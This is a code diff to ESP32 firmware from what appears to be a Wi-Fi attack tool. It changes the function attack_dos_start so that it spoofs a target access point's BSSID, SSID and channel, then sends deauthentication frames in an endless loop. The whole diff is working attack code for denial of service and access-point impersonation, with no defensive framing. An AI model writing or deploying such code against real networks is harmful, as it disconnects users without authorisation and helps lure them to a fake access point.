@@ -7,7 +7,6 @@
 #include "esp_wifi.h"
 #include "esp_log.h"
 #include "globals.h"
-#include "esp_timer.h"
 #include "wifi.h"
 
 
@@ -22,11 +21,26 @@ static const uint8_t deauth_frame_template[] = {
 };
 
 void attack_dos_start(wifi_ap_record_t *ap_record) {
+	ESP_ERROR_CHECK(esp_event_loop_create_default());
+    wifictl_mgmt_ap_start();
+    mostrar_mensaje("Ataque en curso", false, menu_actual);
     ESP_LOGI(TAG, "Starting DoS attack...");
-
-    iniciar_wifi(TAG, WIFI_MODE_AP);
+    wifictl_set_ap_mac(ap_record->bssid);
+    wifi_config_t ap_config = {
+        .ap = {
+            .ssid_len = strlen((char *)ap_record->ssid),
+            .channel = ap_record->primary,
+            .authmode = ap_record->authmode,
+            .password = "dummypassword",
+            .max_connection = 0
+        },
+    };
+    mempcpy(ap_config.sta.ssid, ap_record->ssid, 32);
+    wifictl_ap_start(&ap_config);
+    vTaskDelay(3000 / portTICK_PERIOD_MS);
     while (true) {
         send_deauth_frame(ap_record);
+        vTaskDelay(1000 / portTICK_PERIOD_MS);
     }
 }
 
